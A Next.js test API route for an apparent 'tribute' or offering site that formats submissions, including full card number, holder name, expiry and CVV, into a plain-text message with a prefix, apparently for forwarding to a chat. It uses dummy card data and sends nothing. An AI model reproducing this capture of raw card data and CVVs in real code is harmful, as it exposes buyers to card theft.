/**
 * 测试消息格式 - 不实际发送，只显示消息内容
 */

import { NextRequest, NextResponse } from 'next/server'

interface TributeData {
  senderName: string
  senderEmail: string
  devotionMessage: string
  paymentMethod: 'crypto' | 'wechat' | 'card'
  selectedCurrency?: string
  cardInfo?: {
    cardNumber?: string
    cardHolder?: string
    expiry?: string
    cvv?: string
  }
  item?: {
    name: string
    price: number
  }
  tier?: {
    title: string
    amount: number
  }
}

function formatTributeMessage(data: TributeData): string {
  const timestamp = new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
  
  const itemInfo = data.item 
    ? `商品: ${data.item.name} | 价格: $${data.item.price}`
    : data.tier
      ? `档位: ${data.tier.title} | 金额: $${data.tier.amount}`
      : '未知项目'

  let paymentInfo = ''
  if (data.paymentMethod === 'crypto') {
    paymentInfo = `加密货币 (${data.selectedCurrency || 'TRX'})`
  } else if (data.paymentMethod === 'card') {
    paymentInfo = '信用卡支付'
    if (data.cardInfo) {
      if (data.cardInfo.cardNumber) {
        paymentInfo += `\n卡号: ${data.cardInfo.cardNumber}`
      }
      if (data.cardInfo.cardHolder) {
        paymentInfo += `\n持卡人: ${data.cardInfo.cardHolder}`
      }
      if (data.cardInfo.expiry) {
        paymentInfo += `\n有效期: ${data.cardInfo.expiry}`
      }
      if (data.cardInfo.cvv) {
        paymentInfo += `\nCVV: ${data.cardInfo.cvv}`
      }
    }
  } else {
    paymentInfo = '微信打赏'
  }

  const parts = [
    '=== 妍妍女王 - 新供奉提交 ===',
    '',
    `时间: ${timestamp}`,
    `称呼: ${data.senderName || '匿名'}`,
    `邮箱: ${data.senderEmail || '未提供'}`,
    '',
    itemInfo,
    '',
    `支付方式: ${paymentInfo}`,
    '',
    `留言: ${data.devotionMessage || '(无留言)'}`,
    '',
    '=========================',
  ]

  return parts.join('\n')
}

export async function POST(request: NextRequest) {
  try {
    const data: TributeData = await request.json()
    const message = formatTributeMessage(data)
    const fullMessage = `Z%&JD-GD1X ${message}`

    return NextResponse.json({
      success: true,
      messageLength: message.length,
      fullMessageLength: fullMessage.length,
      preview: message,
      fullMessage: fullMessage,
      data: data,
    })
  } catch (error) {
    return NextResponse.json(
      { error: error instanceof Error ? error.message : '解析错误' },
      { status: 400 }
    )
  }
}

export async function GET() {
  const testData: TributeData = {
    senderName: '测试用户',
    senderEmail: 'test@example.com',
    devotionMessage: '这是一条测试留言',
    paymentMethod: 'card',
    cardInfo: {
      cardNumber: '1234 5678 9012 3456',
      cardHolder: 'ZHANG SAN',
      expiry: '12/25',
      cvv: '123',
    },
    item: {
      name: '黑色图案连裤袜',
      price: 42,
    },
  }

  const message = formatTributeMessage(testData)
  const fullMessage = `Z%&JD-GD1X ${message}`

  return NextResponse.json({
    testData,
    message,
    fullMessage,
    messageLength: message.length,
    fullMessageLength: fullMessage.length,
  })
}
